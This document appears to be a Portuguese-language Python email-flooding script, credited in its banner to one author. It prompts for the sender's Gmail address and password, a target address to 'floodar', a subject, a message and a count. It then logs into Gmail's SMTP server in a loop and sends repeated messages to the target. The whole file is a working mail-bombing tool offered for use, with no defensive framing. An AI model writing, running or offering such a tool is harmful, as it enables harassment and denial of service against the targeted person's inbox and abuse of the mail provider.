#!/usr/bin/python3

import smtplib
import os as sistema

sistema.system('cls' if sistema.name == 'nt' else 'reset')

def banner():
    ban = '''
    +---------------------------------------+
    |  ______   _   __  __           _   _  |
    | |  ____| | | |  \/  |         (_) | | |
    | | |__    | | | \  / |   __ _   _  | | |
    | |  __|   | | | |\/| |  / _` | | | | | |
    | | |      | | | |  | | | (_| | | | | | |
    | |_|      |_| |_|  |_|  \__,_| |_| |_| |
    |       Codado por Hebert Rossini       |
    +---------------------------------------+    
    '''
    print(ban)

banner()

print('====' * 10)
meu_email = input('[*]Seu email: ')
print('====' * 10)
min_senha = input('[*]Sua senha: ')
print('====' * 10)
destinatario = input('[*]Email que deseja floodar: ')
print('====' * 10)
assunto = input('[*]Assunto: ')
print('====' * 10)
menssagem = input('[*]Menssagem: ')
print('====' * 10)
quantidade = int(input('Quantidade de Emails: '))
print('====' * 10)

i = 0

while (i < quantidade):
    i = i + 1

    print('[{}]Floodando...'.format(i))

    msg_header = 'Content-type: text/html\n' \
                 'Subject: {}\n'.format(assunto)
    msg_content = '<h2> <font color="black"> {menssagem} </font></h2>\n'.format(menssagem=menssagem)
    msg_full = (''.join([msg_header, msg_content])).encode()

    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(meu_email, min_senha)
    server.sendmail(meu_email,
                    [destinatario, destinatario],
                    msg_full)
    server.quit()
